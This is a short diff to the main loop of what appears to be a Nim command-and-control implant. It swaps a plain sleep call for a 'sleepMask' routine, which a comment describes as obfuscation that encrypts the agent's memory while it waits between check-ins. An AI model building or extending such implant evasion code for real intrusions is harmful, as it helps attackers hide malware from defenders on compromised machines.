@@ -1,6 +1,6 @@
 import strformat, os, times, system, base64
 
-import core/[http, context]
+import core/[http, context, sleepmask]
 import protocol/[task, result, heartbeat, registration]
 import ../modules/manager
 import ../common/[types, utils, crypto]
@@ -32,10 +32,14 @@ proc main() =
         4. If additional tasks have been fetched, go to 2.
         5. If no more tasks need to be executed, go to 1. 
     ]#
+
     while true: 
 
         # TODO: Replace with actual sleep obfuscation that encrypts agent memory
-        sleep(ctx.sleep * 1000)
+
+        sleepMask(ctx.sleep * 1000)
+
+        # sleep(ctx.sleep * 1000)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
